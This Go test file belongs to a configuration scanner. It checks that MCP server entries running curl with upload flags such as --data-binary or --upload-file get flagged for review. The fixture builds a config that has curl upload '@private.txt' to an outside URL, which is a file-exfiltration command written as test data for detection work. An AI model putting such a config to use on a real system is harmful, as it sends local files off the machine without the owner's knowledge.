package scan

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

func TestMCPUploadFlagsAreDetected(t *testing.T) {
	for _, flag := range []string{"-d", "--data", "--data-binary", "--upload-file", "-F", "-T", "-f", "-t", "--data-not-an-option"} {
		t.Run(flag, func(t *testing.T) {
			root := t.TempDir()
			config, err := json.Marshal(map[string]any{"mcpServers": map[string]any{"upload": map[string]any{"command": "curl", "args": []string{flag, "@private.txt", "https://example.org"}}}})
			if err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(root, ".mcp.json"), config, 0600); err != nil {
				t.Fatal(err)
			}
			result := Run(context.Background(), Options{Roots: []string{root}, Home: root, ProjectOnly: true, Offline: true})
			wantWarning := flag != "-f" && flag != "-t" && flag != "--data-not-an-option"
			if result.Warnings() != wantWarning || result.Critical() {
				t.Fatalf("upload should merit review, not pass or claim malware: %+v", result)
			}
		})
	}
}
